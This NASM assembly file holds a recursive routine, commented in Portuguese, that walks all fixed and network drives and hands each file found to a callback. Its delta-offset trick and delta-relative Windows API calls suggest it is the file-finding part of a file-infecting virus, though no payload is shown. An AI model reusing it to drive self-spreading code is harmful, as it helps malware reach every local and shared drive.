;for NASM

SIZEOF_WIN32_FIND_DATA		  equ 0140h
WFD_dwFileAttributes		  equ 0000h
WFD_szFileName			  equ 002Ch

busca_recursiva:                                ;parametro=rotina de arquivo
       pushad
       sub esp, 4
       mov ebp, esp
       call delta2                              ;esi==delta
       mov dword [ebp], "@:\"                         ;inicia busca por A:\
  proximo_disco:
       cmp byte [ebp], "Z"
       je feito                                 ;se j  tamos no Z:\, para
       inc byte [ebp]
       push ebp
       call dword [esi+GetDriveTypeA]
       cmp al, 3                                ;‚ disco rigido?
       je fixo
       cmp al, 4                                ;ou disco de rede?
       jne proximo_disco
  fixo:
       push ebp
       call dword [esi+SetCurrentDirectoryA]
       test eax, eax
       jz proximo_disco
       push dword [esp+(8*4)+8]                   ;rotina CALLBACK
       call busca_disco                         ;busca dentro dos diretorios
       jmp proximo_disco
  feito:
       add esp, 4
       popad
       ret 4

busca_disco:
       pushad
       sub esp, SIZEOF_WIN32_FIND_DATA+4+4+4
       mov ebp, esp
       call delta2
       mov dword [ebp+SIZEOF_WIN32_FIND_DATA], "*.*"         ;constroi mascara de busca
       mov dword [ebp+SIZEOF_WIN32_FIND_DATA+4+4], ".."      ;e para mudar de diretorio
       lea eax, [ebp+SIZEOF_WIN32_FIND_DATA]
       push ebp
       push eax
       call dword [esi+FindFirstFileA]
       mov dword [ebp+SIZEOF_WIN32_FIND_DATA+4], eax         ;salva handle da busca
       inc eax
       jz sobe_dir
  verifica_dir:
       lea eax, [ebp+WFD_szFileName]
       test dword [ebp+WFD_dwFileAttributes], 10h
       jnz near e_dir
       push eax
       mov eax, [esp+(8*4)+(SIZEOF_WIN32_FIND_DATA+4+4+4)+8]
       call eax                                 ;chama CALLBACK
  continua_busca:
       push ebp
       push dword [ebp+SIZEOF_WIN32_FIND_DATA+4]
       call dword [esi+FindNextFileA]                 ;procura proximo arquivo
       test eax, eax
       jnz verifica_dir
  sobe_dir:
       push dword [ebp+SIZEOF_WIN32_FIND_DATA+4]
       call dword [esi+FindClose]
       lea eax, [ebp+SIZEOF_WIN32_FIND_DATA+4+4]       ;ponteiro para ".."
       push eax
       call dword [esi+SetCurrentDirectoryA]
       add esp, SIZEOF_WIN32_FIND_DATA+4+4+4
       popad
       ret 4
  e_dir:
       cmp byte [eax], '.'
       je continua_busca                        ;evita travar
       push eax
       call dword [esi+SetCurrentDirectoryA]          ;entra no diretorio
       test eax, eax
       jz continua_busca
       push dword [esp+(8*4)+(SIZEOF_WIN32_FIND_DATA+4+4+4)+4]
       call busca_disco                         ;busca recursiva
       jmp continua_busca

delta2:
       call delta3
  delta3:
       pop esi
       sub esi, delta3
       ret
